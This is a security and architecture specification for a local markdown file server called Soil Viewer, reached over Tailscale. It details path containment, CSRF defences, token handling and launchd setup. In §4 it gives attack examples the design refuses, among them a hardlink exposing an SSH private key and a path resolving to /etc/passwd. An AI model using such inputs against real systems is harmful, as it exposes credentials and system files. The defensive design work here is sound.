# Architecture & Security Spec v2 — Soil Viewer

**This is the document the source comments cite.** A reference to `§7` or `§13.5` anywhere in the code means a section of this file.

It began as a build-time specification and still reads like one: **MUST / MUST NOT is law**, and each section opens in plain language before stating rules. That voice is kept deliberately. The rules are not a description of what the code happens to do — they are the contract it is held to, and the tests exist to catch it drifting.

**A second version, and the reason matters more than the fact.** The first version was attacked by three independent reviewers and all three returned *not safe as written*. What replaced it carries their findings inline rather than as a separate audit, because a safety lesson living in a review document is a lesson the next builder does not read. Where a rule looks oddly specific, it is usually because something went wrong once; where it says a claim was false, the claim was in an earlier draft of this file.

Every fix from that review was spec text rather than redesign — with one exception, and it was structural. An investigation into the editor proved that the WYSIWYG architecture the first version assumed **destroys markdown structurally**: it parses a file to a document model and writes the model back, so a document merely opened comes back rewritten. CodeMirror 6 replaced it, holding the file's real text and painting formatting over it. That single change dissolves a whole cluster of data-loss surface, which is why several sections here are written from a different premise rather than patched.

**Ids in the form F1.2, C5, M13, FT-7** are findings from that review, kept so a rule can be traced to the specific failure that produced it.

**Every MUST becomes an acceptance test (§20).** A rule nothing can fail is a rule nobody keeps.

**Two ground rules for the whole document.** (1) *"Convert the audit to tests" is retired* — every safety lesson is written here explicitly, because the audit was proven lossy. (2) *Write the rule, not the slogan.* Round 2's most useful category was "sentences a builder can honor exactly and still ship the bug." Where v1 said something true but unenforceable, v2 says the mechanical thing instead.

---

## 0. Decisions this spec is built on

Settled before the build began, and not open to a builder to relitigate. Each names the section that carries it.

| Decision | Consequence |
|---|---|
| **Editor is CodeMirror 6** | The buffer *is* the file text. Nothing re-serializes. §12. |
| **No journal, no app-side backup** | Git is the recovery layer. Prevention rules carry the weight. §13.1. |
| **Tables ship as styled monospace in v1** | No editable grid. No markdown regeneration anywhere. §12. |
| **Grammar is shapes, not configuration** | A folder's name decides what it is, at any depth. No config surface, no glob ambiguity. §3. |
| **Tailnet trust, no device pairing** | Browser-side defenses become load-bearing, and all stay in. §7. |
| **Server has zero third-party runtime dependencies** | Standard library only. Client bundle is prebuilt and committed. §2. |
| **The application is self-contained under `app/`** | Source, tests and configuration in one place, with nothing above it that the build needs. |

---

## 1. Threat model — who we are defending against (F1.2)

**Plain:** Worth being honest about who this protects you from, and who it doesn't.

**In scope, defended:**
- **A malicious web page you visit** driving your local server through your own browser. This is the main one, it is real, and it is the attacker the Electron app never had to think about. §7.
- **Malicious markdown** — your tree is written by agents; a file rendering in the app's origin must never execute. §8.
- **A file that isn't what its name says** — an `.html` or `.svg` served from your tree taking over the app origin. §9.
- **Path escape** — anything reaching disk outside a registered folder. §4.
- **Ordinary accidents that corrupt files** — the largest category by far, and the one the operator actually asked about. §13.

**Out of scope, accepted, recorded:**
- **Any process already running as the operator** (an `npm postinstall`, another agent, a downloaded binary) has full API access over loopback. Nothing in a local-server design prevents this. The security review's npm floor is what reduces it; it is not eliminated. *Accepted risk, stated so it is a decision rather than an oversight.*
- **Any device on the tailnet** can reach the files (the user's tailnet-trust call). Revisit if a node is ever shared.
- **A stolen or lent phone** cannot be revoked from inside the app — only via tailnet ACL. §7 adds the compensating controls (viewer identity in Settings, mutation log).

---

## 2. The shape, and the runtime — named

**Plain:** One small program runs on the Mac. It holds all file logic and is the only thing that ever touches disk. The browser — Mac or phone — is a screen that talks to it. An Electron app later would be a window around the same program.

**Rules:**
- **Runtime: Node.js 24 LTS. Language: TypeScript**, compiled to JavaScript ahead of time. *(v1 never named these; a reviewer correctly flagged that a builder was entitled to guess otherwise.)*
- Three layers, one direction of dependency: **Core** (file engine — grammar, indexing, watching, path safety; knows nothing about HTTP) → **Contract** (one typed API describing every operation) → **Adapters** (the HTTP server now; an Electron wrapper later, if ever). The Core MUST NOT import anything HTTP- or browser-specific.
- **Zero third-party *runtime* dependencies in the server** — `node:http`, `node:fs`, `node:path`, `node:crypto`, `node:worker_threads` and the filesystem-watch primitive only. If a server feature appears to need a package, it is **escalated to the operator, never added silently.** *(This is a real constraint with real consequences — see §5 on watcher drop signals, where it forces a design rather than being quietly downgraded.)*
- The browser bundle is built from source by `npm run build` and is **not** committed — `app/dist/` is ignored. The claim that it ships prebuilt was true of an earlier arrangement and is kept here corrected rather than quietly dropped. Build-time tooling is pinned exact and the lockfile is committed, so a build is reproducible from the lockfile alone.
- **Electron-readiness is satisfied entirely by the layering.** No Electron-specific decision is made in v1.
- **The app shell is served from a build-time in-memory asset map, never by mapping a URL to a disk path** (F8.6) — otherwise §4 is bypassed for the shell route. `/.well-known/*` is not served.

**Enforcement, not aspiration** (round 2's letter-vs-spirit set — each of these is a CI check):
- **`node:fs` MUST NOT be imported anywhere outside the Core's single filesystem module.** Lint-enforced. Every call into it takes an already-validated handle, never a raw string.
- **The route table is built *from* the validation wrapper**, so an unwrapped handler is not expressible. CI asserts route count equals wrapped-handler count.
- CI fails if `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, or `srcdoc` appears in client source (§8).
- CI fails if `'unsafe-inline'` or `'unsafe-eval'` appears anywhere in the CSP outside `style-src` (§8).
- CI fails on any string interpolation into a command line (§10).

### 2.1 Background start at login — the launchd contract

*Added 2026-08-06. The PRD requires the server be "background-startable at login" and the build
plan assigns it to P12, but **no document specified it** — a phase with a deliverable and no
rules. The pattern below is taken from an earlier application that ran this way in production for over a
month; every item is something it learned rather than assumed.*

- **A user LaunchAgent (`gui/<uid>`), not a LaunchDaemon.** The Mac has FileVault on, so nothing
  runs after a reboot until the operator unlocks the disk — and that unlock flows into their login
  session, which loads the agent. A daemon would buy nothing. **State the honest consequence: the
  server returns after reboot *plus* disk unlock, not after reboot alone.** True unattended
  recovery would require disabling FileVault, which is not on the table.
- **The plist tracked in this repository is the source of truth; the live copy is installed to
  `~/Library/LaunchAgents/` and loaded with `launchctl`.** Editing the tracked copy does nothing
  until it is reinstalled. Say so in the file's own header comment.
- **`RunAtLoad` and `KeepAlive` both true** — start at login, restart on crash. Prove it by
  killing the process and watching it return.
- **Absolute interpreter path, plus an explicit `PATH` in `EnvironmentVariables`.** launchd
  inherits almost nothing from a login shell. A bare `node` will not resolve.
- **`WorkingDirectory` is load-bearing** if any path in the app is resolved relative to the
  current directory — the asset map, `dist/`, anything. Set it explicitly.
- **`StandardOutPath` and `StandardErrorPath` redirected to files.** A launchd-started Node
  process's stderr is otherwise invisible, and a crash leaves no trace.
- **All configuration through environment variables** — ports, roots, log paths. This is what
  makes a second instance possible on another port with a separate data root, which the
  two-listener model and any staging instance both need.
- **Restart is `launchctl kickstart -k`. A change to the plist's environment requires
  `bootout` + `bootstrap`** — kickstart restarts the process with the environment launchd already
  loaded, so an env edit appears to do nothing.
- **System sleep stops everything.** Screen lock is fine; sleep is not. `pmset -g` should show
  `sleep 0` on AC power. **This modifies system power settings and is outside an agent's hands —
  it is the operator's action, and it belongs in P12's brief as a named prerequisite, not discovered
  during it.**
- **TCC is a real risk here, and the earlier application is no evidence against it.** That app never hit a permission
  prompt because it only touches files inside its own repository. **Soil Viewer registers
  arbitrary user folders, so a background process will meet `EPERM` on `~/Documents`, `~/Desktop`,
  iCloud and external volumes with no prompt at all** (§5). Probe at startup and at registration;
  enter the named "permission needed" state; reconcile on grant.
- **Ship a double-clickable recovery script for a non-technical owner** — probe health, restart if
  down, fall back to `bootstrap` if the agent is not loaded, and on failure print plain English
  plus a tail of both log files. The earlier application has one, and it is the difference between "it's broken" and a
  report someone can act on.

---

## 3. The folder grammar — shapes, not a configured list

**Plain:** The app knows what's a project, a task, an inbox or an archive purely from *where a file sits*. v1 made this configurable, which created a settings surface that did not exist and a dozen unanswered questions about matching. The call was to compile a working set of shapes in instead: zero config, zero ambiguity, and a fork that wants different conventions edits one file.

**The gate is a folder's name, not its depth or its parents.** This is the load-bearing property and it was not always true — the rule below was widened on 2026-08-28 after the narrower version turned out to encode one particular filing layout into software whose whole claim is that the tree is the state. A folder called `projects` three levels into somebody else's arrangement was not a project root, and nothing inside it rendered.

**Rules — one file, `core/grammar.ts`, the single source:**

```ts
// The GATE: any folder whose name is `projects` is a project root, wherever it sits.
// Everything directly inside one is a project.
export const PROJECT_ROOTS       = ['02-projects']        // conventional spelling, NOT the gate
export const NESTED_PROJECTS_PATH = ['02-work', 'projects'] // also conventional, also not the gate

export const INBOX_NAMES   = ['01-inbox','inbox','99-inbox-main','01-department-inbox','00-inbox']
export const ARCHIVE_NAMES = ['archive','_archive']     // numeric prefix matched separately
export const TASKS_DIR     = 'tasks'
```

- **`PROJECT_ROOTS` and `NESTED_PROJECTS_PATH` are the *conventional* spellings** — what the shipped template uses and what the documentation describes. They are kept because they are useful defaults, and they are **called by nothing that decides anything.** The new rule subsumes both: `02-projects` at the top still matches, and so does `<project>/02-work/projects`, because in each the folder is named `projects`.
- **There is no `LANES` constant governing statuses.** Statuses are the folders that are actually there. A tree that wants `waiting-on-legal` gets it by making the folder, and the app renders it with no list to keep in step.

- **One matching rule for every name list, stated once** (fixes contradiction #12, where three lists had three different semantics): a segment matches a list entry if, after **NFC normalization**, **stripping an optional leading `NN-` numeric prefix**, and **Unicode simple case-folding**, the result equals the entry. This rule is a single exported function; nothing re-implements it.
- **Projects are resolved at walk time, not by a stored glob** (fixes contradiction #11, which was load-bearing and undecided): a directory is a project if its parent folder is named `projects`. Evaluated live, so a project created today appears today. Nesting falls out of that rule rather than being a separate case — a `projects` folder inside a project is a project root like any other, to any depth.
- **Lanes are the immediate subfolders of a `tasks` directory located under a project.** Nothing deeper is a card in that lane. Display name strips the `NN-` prefix (`02-next` → "Next"); order follows the numeric prefix, then alphabetical.
- **The "Uncategorized" lane** (ruled 2026-07-29; **named `Uncategorized` on 2026-08-06** — the working label "No Status" used until then was never the agreed name). Markdown sitting **directly in a `tasks` folder**, in no lane subfolder, appears in a leftmost synthetic lane called **Uncategorized**. It is not a folder and is never created on disk — *the absence of a lane folder is itself a state*, which is the folder-as-state principle followed to its end rather than an exception to it. Dragging a card **out** of Uncategorized moves the file into that lane's real folder; dragging a card **into** Uncategorized moves the file up to the `tasks` folder root. Both are ordinary moves under §13.7 and obey every rule there. Uncategorized is hidden when empty. *(This supersedes the earlier decision that the board shows lane-resident tasks only, and removes the need for any manual pre-sorting.)*
- **Archive exclusion:** a match at **any ancestor level** excludes the subtree from Tasks, Projects, Inbox, and every derived live set — **but not from Files** (M6/contradiction #2, found independently by two reviewers; v1's rule made the only sanctioned retire path impossible). In Files, archive subtrees render **collapsed and de-emphasized, and are valid Move destinations.**
- **Ignore list — never indexed, never watched, never walked:** any segment beginning `.` (this covers **directories and files** — hundreds of `.DS_Store` and `.gitkeep` files in a real tree were being walked and watched under v1, FT-6/contradiction #14), `node_modules`, `*.app` bundles, `release/`, `out/`, `dist/`, `.next/`. No show-hidden toggle in v1.
- **Ignore rules evaluate against the folder-relative path, whole segments** — a registered folder living under a dot-directory is still watched; a file named `x-node_modules.md` is not skipped.
- **Template roots are ignore-listed for *indexing* and explicitly permitted as *template sources*** (contradiction #15 — v1 had the ignore list fighting the primary use case). Being unindexed is not being unreadable.
- **Only markdown becomes a task card** (FT-7). Inbox shows markdown and folders; other types appear as non-editable entries with a glyph, never as cards.
- **Conflict artifacts are grammar-excluded** everywhere except Files (C5).
- **Objectives** (`02-work/objectives`) is a shape the templates define with no tab in v1 — noted, not built.

---

## 4. Path safety, identity, and the one checker

**Plain:** The app may only ever touch files inside folders you registered. This is the wall everything else leans on, and round 2 found three ways through it that v1 didn't address.

**Rules:**
- **One containment module. `node:fs` is importable nowhere else** (§2). Never re-implemented inline.
- **Composition** (F4.4 — `path.resolve(root, '/etc/passwd')` silently discards the root): `path.join` only; **`path.resolve` is forbidden for composing user input.** Before composing: NFC-normalize; reject NUL; percent-decode **exactly once** and reject any remaining `%`; reject a leading separator, drive letters, and empty input; split into segments and reject any `..`, `.`, or empty segment. Re-verify containment after composition.
- **Symlinks inside a registered folder are refused, not resolved** (F4.1 — TOCTOU). The checker `lstat`s **every segment from the root down** and refuses any symlinked segment. It records `(dev, ino)`. The open uses `O_NOFOLLOW`; `fstat` on the descriptor MUST match the recorded pair; **all I/O goes through that descriptor, never a re-opened path.** The nearest-existing-ancestor rule for not-yet-existing targets inherits this, with non-recursive `mkdir` re-verified after creation.
- **Hardlinks defeat containment and v1 never mentioned them** (F4.2 — `ln ~/.ssh/id_ed25519 /soil/notes.md` passes every v1 check). Every file read or written MUST be `S_ISREG` — FIFOs hang the server forever, `/dev/zero` is unbounded memory. A regular file with `st_nlink > 1` is **refused in both directions** with a named error. Reads capped at 25 MB.
- **Unicode and case are security controls, not §11 housekeeping** (F4.3, M5 — v1 said "define case explicitly" twice and never defined it, which is circular). **The answer:** identity keys are **NFC-normalized, Unicode-simple-case-folded relative paths** on case-insensitive volumes, and **NFC exact bytes** on case-sensitive ones. Case sensitivity is **probed once per root at registration** and stored. Display always uses the on-disk bytes; only comparison normalizes. This governs containment, archive/ignore matching, the registration deny-list, the extension allowlist, the append-lock key, and index keys.
- **File identity is `(dev, ino)` from a descriptor — never a path string.** Path strings are not identities (F7.4): overlapping roots, case variants and NFC/NFD all produce two strings for one inode, which is precisely how two clients defeat a lock.
- Symlinks **are** shown in the tree with their own glyph; clicking resolves; a rename targets the resolved real path, never the link (FT-9).

---

## 5. Indexing, watching, scale

**Plain:** The app keeps a live picture of your files in memory, updates only what changed, and watches the disk natively instead of re-reading everything every few seconds — which is why the old one choked.

**Rules:**
- **Incremental only.** A change to one file updates only that file's entry.
- **No polling — stated mechanically** (v1's "no polling" was satisfiable by a 30s timer): **no timer may trigger a filesystem read of more than one path**, and no client reconnects faster than exponential backoff 1s → 60s.
- **No rebuild as routine — but recovery exists** (F4.6/M11; v1's "no full-rebuild code path anywhere" made the index un-resyncable, which then made the conflict check fail open after any dropped event). The rule is: **no mutation handler and no single watcher event may trigger reindexing beyond the affected paths.** Bounded, per-subtree **reconciliation** is permitted and required on watcher error/restart, wake-from-sleep, re-registration, explicit refresh, and whenever an operation meets a path that contradicts the index. It runs off the request path and shows a visible "resyncing" state.
- **The index is authoritative for display only. Disk is authoritative for every write decision** (F4.6 — this is the sentence that keeps "never overwrite an external edit" from failing open). No write ever consults an index mtime.
- **Node's `fs.watch({recursive:true})` does not surface FSEvents' `MustScanSubDirs` / `UserDropped` / `KernelDropped` flags** — the exact signals that mean *rescan* (M11). Under §2's zero-dependency rule the server cannot see them. **Therefore reconciliation is scheduled defensively**: on every watcher restart, on wake, and on any index contradiction. If this proves insufficient in daily use it is **an escalation under §2, never a silent downgrade of correctness.**
- **Watcher echo dedup keys on the exact `(path, size, mtimeNs)` the app wrote** — never a time window, which would swallow a real agent change (round-2 minor).
- **Segment-boundary path comparison everywhere.** Raw `startsWith` on paths is **forbidden** — it was a real bug in the lab code that the master audit missed.
- **Request sequencing:** every async load carries a monotonic request id; out-of-order responses are discarded.
- **Watcher-storm coalescing:** a `git checkout` or an agent writing 500 files is coalesced, **250 ms window**, not one reindex per event.
- **Budgets, with actual numbers** (v1 said "Budgets, stated" and stated none): cold-start index of 10,000 files streams and never blocks first paint; the index holds **path, title, mtime, size, `(dev,ino)`** — never file bodies; first-heading extraction reads **at most 64 KiB** and truncates the title to **200 chars**.
- **First-heading extraction is fence-aware *and* frontmatter-aware** (FT-8 — 602 real files open with `---`, and a YAML comment is a `#` at line start, so v1 would have made YAML comments into card titles). Skip the frontmatter block, then skip fenced and indented code. Markdown only.
- **Volume identity** (M12): record volume UUID + root inode at registration; verify before every mutation; enter a named "unavailable" state on mismatch. **Never recreate a missing root** — writing into a phantom directory on the boot volume is silently shadowed the moment the drive returns.
- **Cloud-sync folders** (M8): detect provider roots at registration and warn. **Never force-materialize a dataless placeholder during indexing** — v1's title extraction would have force-downloaded the entire tree on first index. Title falls back to filename, marked "not downloaded." Provider conflict files are treated as conflict artifacts and grammar-excluded. A provider read failure is *"not available offline"* — **never an empty document** (this is the C2 path).
- **TCC / permissions** (M13): a background process gets `EPERM` on `~/Documents`, `~/Desktop`, iCloud and external volumes **with no prompt**. Probe at startup and registration; named "permission needed" state; reconcile on grant.
- **Scale target:** responsive at 10,000+ markdown / 50,000+ total files.

---

## 6. The API contract and its chokepoint

**Plain:** Exactly one doorway between screen and file engine. Everything passes through it and is checked. The old app had a contract that was never actually enforced — that's how bugs got in.

**Rules:**
- One shared typed contract; CI fails on drift.
- **One validation wrapper, and the route table is generated from it** (§2) so an unchecked route cannot exist.
- Path parameters are always **`(registered-folder id, relative path)`**. The API **never** accepts an absolute path.
- The boundary rejects unknown keys, non-string paths, `__proto__` and prototype-pollution keys, and over-limit bodies.
- **The markdown rule is server-side law, not client routing** (C1/FT-1 — v1 stated `.md`-only as UI behavior and never enforced it at the chokepoint; the old app made exactly this mistake). **`isMarkdown()` is one predicate in Core and the only extension test in the codebase**: the final extension, NFC-normalized and ASCII-lowercased, equals `md`. Write and append accept **only** paths satisfying it, regardless of what the client asked. The same predicate drives the tree glyph, the editor gate, the indexer, title extraction and the chatroom match. Divergence is a build failure. `.markdown`, `.mdx` and case variants are **named and excluded** (FT-12) so a helpful builder doesn't quietly widen the set.
- **The only non-markdown bytes the app ever writes** are recursive-copy output (byte-for-byte, never modified) and app config outside every root.
- **`MAX_EDITABLE_BYTES = 2 MiB`**, and the API body limit is **`MAX_EDITABLE_BYTES + 64 KiB`** and MUST NOT be lower — otherwise a save is rejected for size *after* the edit was accepted (FT-3). *Correction, 2026-09-02.* The limit is set at **`MAX_EDITABLE_BYTES × 2 + 64 KiB`**. The content is JSON-escaped in transit, which doubles every newline, quote, backslash, tab and carriage return, so `+ 64 KiB` alone left a document of short lines editable and unsavable — FT-3 by another route. The figure above stands as the floor this sentence states. The residual above 2× — a document more than a fifth raw control characters — is pinned in `body.test.ts` rather than covered, because covering it would hold 12 MiB per connection.
- Every response is a typed success or a typed error. **An empty-but-successful result never stands in for a failure.** An empty list means the directory was empty, never that reading it failed. No catch block converts failure to empty success.
- **Errors** (F8.7): stable machine codes; no stack traces, no absolute paths outside a root, no verbatim client strings. Full detail goes to the local log. **The client renders errors as text, never as markdown.**
- **Limits** (F8.1–F8.6): `headersTimeout` 10s · `requestTimeout` 30s · `keepAliveTimeout` 5s · headers 16 KB · URL 2 KB · body 1 MB (except the editable-write route above) · **256 connections, GLOBAL** · **token bucket 120 burst / 50 per second, GLOBAL** → 429.

  *Corrected 2026-08-07 (the security review's K2 and K4).* This said *"256 connections, 64 per address"* and
  *"token bucket 20/s"*. **Both per-source claims are undeliverable here and both were shipping as
  something other than what they said.** Every device arrives on a fresh loopback connection from
  `tailscale serve`, so a per-address key holds exactly one value: the connection cap was a global
  64 wearing a per-address name, with the stated 256 unreachable by construction. A per-source cap
  cannot be delivered at all on the connection event, where no HTTP exists yet and no identity can be
  read — and `X-Forwarded-For` is refused as a key for the reason §7 already gives. So both are
  **global**, and named so.

  The token bucket was additionally **too small for the app's own page loads**. A cold load costs six
  requests (measured); 20 was three of them, and a refused stylesheet has no retry, so it presented
  as the app being broken rather than as a rate limit. 120/50 covers four devices cold-loading at
  once, twice over.

---

## 7. Network, listeners, and CSRF

**Plain:** Your phone reaches the app through Tailscale. The subtle danger is that a website you visit could quietly command the app through your own browser — and v1 got the defense against this factually wrong.

**Two listeners, and this became a standing convention** (F6.1/F6.2 — ratified by the security review on 2026-07-29):

v1 gated folder registration on "requests from `127.0.0.1` only." **That gate was inverted and void.** `tailscale serve` is a reverse proxy on the same Mac: it terminates TLS and opens a fresh local connection to `127.0.0.1`. So every phone request passed the gate, and the only requests correctly refused were on the raw tailnet listener nobody uses. Trusting `X-Forwarded-For` instead is also wrong — anything reaching the loopback port forges it. **Headers can demote a request to remote; they can never promote one to local.**

- **`PORT_LOCAL`** — loopback, **never a `serve` target.** ~~Carries the privileged verbs: folder registration and deregistration, the folder-browser enumeration API, Reveal in Finder, Open in Default App, any config write touching roots.~~ **This list is void, and every item on it went for a different reason** — see §21. Registration and the browser were made ordinary Settings on 2026-08-09; Open in Default App was **cut** on 2026-08-09; Reveal in Finder is carried by **both** listeners as of 2026-08-14. **`PORT_LOCAL` today carries no route that `PORT_TAILNET` does not**, and `routes.ts` holds **zero** `local-only` entries — measured, not asserted: 35 `both`, 1 `tailnet-only`. **The mechanism is intact and currently protects nothing.** That is a deliberate, asserted state, not drift.
- **`PORT_TAILNET`** — loopback, the **sole** `serve` target. Those handlers are **not registered on its router at all**, so forgetting a check is not expressible.
- **Privilege is decided by which listener accepted the connection.** Never a source address. Never a header.
- v1's "exactly one listening port" is amended to **"exactly one *tailnet-reachable* target."**

**CSRF — v1's replacement claim was factually wrong** (F1.1/C7). v1 said withholding CORS headers stops cross-origin writes. It does not: it stops an attacker *reading the response*, and does nothing to stop the request being **sent and executed**. The hostname is not secret either — `tailscale serve`'s Let's Encrypt certificate is published in Certificate Transparency logs. **All four of these MUST hold on every non-static route:**

1. **Method policy** — state-changing verbs are POST/PATCH only; no side effects on GET/HEAD; PUT/DELETE/TRACE/CONNECT → 405; OPTIONS → 405 with no CORS headers.
2. **`Content-Type: application/json` required**, rejected **415 before body parsing**, and the parser accepts nothing else. This forces a preflight, which then fails.
3. **Default-deny `Origin` / `Sec-Fetch-Site: same-origin` on every mutation.** **A missing `Origin` and `Origin: null` are rejected** — never treated as same-origin. (`null` covers sandboxed iframes and `file://` pages, e.g. a vault `.html` opened from Finder.)
4. **`Sec-Fetch-Mode: no-cors` rejected.**

Plus **a per-request token in a custom header**, issued to the browser on same-origin load. A custom header is a non-simple request, so it cannot be forged cross-origin. **This is not a login and not device pairing** — the operator's no-pairing decision stands. The security review confirmed it meets the Local Servers floor's write-token requirement: *the intent was "prove this write is legitimate," and a per-request token does that.* Registration additionally requires same-origin **plus** token **plus** an in-app confirmation.

**The token's own properties — MUST, all four** *(added 2026-08-05; see the correction note below)*:

1. **Generated with `crypto.randomBytes`, 16 bytes minimum.** Never `Math.random`, never a timestamp, never a counter, never a hash of anything predictable.
2. **Compared with `crypto.timingSafeEqual`**, never `===` or `==`. A byte-by-byte comparison that returns early leaks the token one character at a time to anything that can measure response time — and everything on the tailnet can.
3. **Any file it is persisted to is mode `0600`**, created with that mode rather than adjusted afterwards.
4. **It is never written to the mutation log, never to an error message, never to a stack trace, and never to any other log.** The mutation log below is append-only, lives outside every registered folder, and is designed never to be deleted — a token that lands in it is recorded permanently. *Addition, 2026-09-02.* Both tokens are persisted to `tokens` in the state directory at `0600` (property 3), and the startup banner prints that file's path and never a token. The LaunchAgent recipe earlier in this document captures stdout to a file at launchd's umask, and until this date the banner carried both tokens into it — the deployment this document prescribes broke the property this clause states.

**How the token reaches the browser, and what authorizes that** *(added 2026-08-07; the security review's
bootstrap-authorization ruling, conditions B1–B8)*:

The clause above says the token is "issued to the browser on same-origin load." **Nothing implemented
that**, and it could not be implemented as written: the shell is served from an immutable in-memory
asset map built at startup, which does no per-request work — by design, because that is what makes
§3's "no client route resolves a URL to a disk path" true. There is nowhere to inject a per-load
value.

It is issued instead by **`POST /api/session.start`**, the one route in the table carrying
`auth: 'none'`, which returns the token **and** a distinct live-stream ticket. The ticket exists
because `EventSource` cannot set a custom header, so the token cannot ride that handshake at all;
they are distinct values so that the token never travels anywhere a URL can reach.

**Reaching the listener is the authorization.** The route hands out the token, so it cannot require
the token. After the ordinary guard chain — duplicate headers, Host, target, Funnel, method,
content-type, Origin — what remains is that the caller reached a listener only the tailnet or
loopback can reach. Stated plainly, and not as an unexamined consequence:

> **The tailnet is the authentication boundary.** Every device on it was explicitly admitted by
> the operator. Admitting a device grants it the full tailnet route set, which from Phase 4 includes write
> access to every registered root. **§1 records this as an accepted risk** — *"Any device on the
> tailnet can reach the files (the user's tailnet-trust call)"* — and the mutation log is the
> compensating control: every issuance is recorded under a stable route name, carrying
> `X-Forwarded-For`, `Tailscale-User-Login` and `Origin`, so the devices that ever obtained a
> credential can be enumerated.

This route does not widen the boundary; it is the first thing that makes §1's decision operative. A
device-pairing step was considered and **refused** — it is already refused above, and it would also
require persisting a device secret, which fails the property below.

**Two delivery properties, both MUST:**

1. **Re-fetchable without a page reload.** The response carries `no-store` and is re-requested when a
   call is refused `403`.
2. **Neither value may outlive the process that minted it.** Not `localStorage`, not
   `sessionStorage`, not a cookie, not IndexedDB, not the cached shell.

The second exists because of §15's resume behaviour: an installed iOS web app is **resumed, never
relaunched**, so a credential cached on the phone survives a Mac restart, is refused by the new
server forever, and nothing ever reloads the page to fix it. The app would be bricked until deleted
and reinstalled.

**Renewal is bounded and status-aware:** renew on **403 only**, at most **once** per failed request,
and **never on 429**. A 429 is the shared rate bucket, and a client that treated it as a stale session
would hammer the issuing route while throttled — deepening the throttle for every other device, out
of a recovery path.

**One token per listener.** The local and tailnet listeners mint separate tokens. A single shared
token authenticated on the listener carrying folder registration as well, and both listeners bind
loopback — so a credential obtained where a phone can reach must not open the door that decides how
much of the disk is in play.

*Correction, 2026-08-05.* §21 states that "Blocker B3 / P0-3's token clauses are **resolved by name**, not left open." **That was only true of the transport clause.** A carried-forward safety requirement listed four further properties — CSPRNG, constant-time compare, `0600`, never logged — and none of them appeared anywhere in this document. The four above close it. A spec that asserts closure over an open gap is worse than one that leaves the item visibly open, because the assertion removes the reason to look. **§20 gains a corresponding acceptance test: assert the token's value appears nowhere in the mutation log after a mutation.**

**Binding, Host, and transport:**
- **Bind loopback only.** `serve` is the sole tailnet path. **The tailnet IP is NOT allowlisted** (F2.2 — v1 allowlisted it, which creates a second plaintext door that silently fails secure-context and kills the clipboard, the service worker and home-screen install: the exact failure the HTTPS decision existed to prevent).
- **Host validation is the first operation, default-deny** (F2.1): raw header, ASCII-lowercased **only** — no trailing-dot strip, no IDNA, no port defaulting, no IPv6 canonicalization, no DNS lookup. Reject multiple `Host` headers, illegal bytes, missing Host, and absolute-form request targets. HTTP/2 `:authority` validated identically. The list is derived at startup from the actual bind config plus the MagicDNS name. The security review blessed this exception to the localhost-only convention **on four conditions, all of which are binding: exact-match allowlist, zero CORS headers, `Origin` validated on the live-update upgrade, and funnel never used.**
- **Never `tailscale funnel` — and it is enforced, not asserted in prose** (F2.4). One mistyped command otherwise puts the app on the public internet with zero auth. Two independent mechanisms:
  - **Reject any request carrying the `Tailscale-Funnel-Request` header.** Tailscale sets this on Funnel requests and only on Funnel requests, and — like the identity headers — strips any incoming copy before setting it, so it cannot be forged into a loopback-only backend. This is a **positive** identification of Funnel.
  - ~~**Check the Tailscale LocalAPI at startup and every 60s.** If the check cannot be completed, enter a named **"funnel status unknown"** state and refuse tailnet-listener traffic until it resolves. The endpoint is documented by Tailscale as not-necessarily-stable, so it MUST NOT be allowed to fail open — a Tailscale upgrade that changes it would otherwise silently turn the check into a no-op.~~ **CUT 2026-08-13 by the operator.** *"I don't think we need something checking that every 60s tbh, funnel is off with no plans on using it."*

    **It was also not implementable as written.** The clause assumes the open-source daemon's local HTTP socket. This Mac runs the **macsys** build, where `tailscaled` lives inside a system extension and its API is reached by a native credential handshake — there is no `tailscaled.socket`, confirmed by looking rather than assuming. The only remaining route was executing the Tailscale CLI every 60 s, which adds a **process-execution surface to an app that deliberately has none** (§10).

    **Why the poll was dropped rather than bought at that price** — the operator's reasoning, checked before it was accepted:
    - **Nothing can force Funnel on from outside.** Enabling it requires the `funnel` node attribute in the tailnet policy file — the admin console, behind their login — **and** a deliberate command run on the Mac as them. There is no remote trigger.
    - **The only scenario the poll would catch is one §1 already accepts as undefendable:** a process already running as the operator. It can read the files directly and has no need of Funnel. The poll would guard a door in a wall that is already down — a control with nothing behind it, and this build deletes those.
    - **It is not standard practice.** No Tailscale convention polls for this; the spec invented it out of caution, and that was not stated plainly when the choice was first put to them.

    **What carries the weight is the positive identification above, and it is a real control rather than a substitute.** Mutation-swept 2026-08-13: removing the `Tailscale-Funnel-Request` refusal turns **four** tests red, including a real socket test asserting 403. The `FunnelWatch` machinery is kept intact — fail-closed, generation-gated, fully tested — and is fed `funnelOffByConfiguration`, a **named assertion** rather than the previous `async () => false`, which at the call site was indistinguishable from a probe that had actually run.

    **Measured the same day, for the record:** Funnel is off (`serve status` reports both mounts *"tailnet only"*), the tailnet holds three devices all owned by the operator, no device is or offers to be an exit node, every peer's routed range is a single `/32` rather than `0.0.0.0/0`, and the MagicDNS name has **no public DNS record** — a public resolver returns nothing for it while returning a normal answer for a control domain.
- **A missing `Tailscale-User-Login` means "unauthenticated principal" — refuse privileged operations. It does NOT mean Funnel.**

  *Corrected 2026-08-05.* The previous rule inferred Funnel from *"proxy headers present but no `Tailscale-User-Login`."* **That inference does not hold, and it failed in both directions.** Tailscale also omits the identity headers for **tagged devices** (documented) and for requests where the identity lookup fails — which Tailscale's own source comment names as including the local machine. So the rule would have **rejected legitimate traffic**. And because `X-Forwarded-For` is set on Funnel traffic too, the presence of proxy headers distinguishes nothing — so the rule would also have **failed to identify the Funnel requests it existed to catch.** A security control that blocks the wrong requests while missing the right ones is worse than none, because it reads as coverage.
- **HTTPS on the tailnet via `tailscale serve`**, which is what makes the phone a secure context (clipboard, service worker, home-screen install). Localhost stays http — localhost is already a secure context. For the record: tailnet traffic is WireGuard-encrypted regardless; HTTPS here is for **secure-context gating**, not confidentiality (F9.3).
- **PREREQUISITE, and it is off by default: HTTPS Certificates must be enabled in the Tailscale admin console** (DNS section; MagicDNS required). *(Added 2026-08-06. an earlier app hit exactly this at its own verification gate — `tailscale serve` had nothing to serve until the toggle was flipped.)* **The one-second check is `tailscale status --json` → `CertDomains`: `null` means certificates are off and nothing downstream will work.** This is an admin-console action only the operator can take, and it gates secure context, and therefore the clipboard, the service worker, and home-screen install — the entire phone story. **Verify it before building anything that depends on it, not at P12.**
